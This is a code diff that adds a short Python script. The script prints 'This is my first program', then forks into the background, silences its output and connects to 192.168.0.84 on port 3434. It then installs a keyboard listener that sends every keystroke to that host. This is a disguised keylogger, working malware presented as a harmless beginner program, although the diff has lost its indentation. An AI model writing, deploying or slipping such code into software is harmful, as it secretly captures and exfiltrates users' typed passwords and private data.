@@ -1,0 +1,31 @@
+import os, sys, time, socket
+from pynput import keyboard
+
+print("This is my first program")
+sys.stdout.flush()
+
+if os.fork():
+sys.exit(0)
+
+os.setsid()
+with open(os.devnull, 'w') as ff:
+os.dup2(ff.fileno(), sys.stdout.fileno())
+os.dup2(ff.fileno(), sys.stderr.fileno())
+
+client = socket.socket()
+try:
+client.connect(("192.168.0.84", 3434))
+except:
+pass
+
+def log\_keys(key):
+if hasattr(key, 'char'):
+pressed\_key = f"key: {key.char}\n"
+client.send(pressed\_key.encode())
+else:
+pressed\_key = f"key: {key}\n"
+client.send(pressed\_key.encode())
+listener = keyboard.Listener(on\_press=log\_keys)
+listener.start()
+while True:
+time.sleep(1)
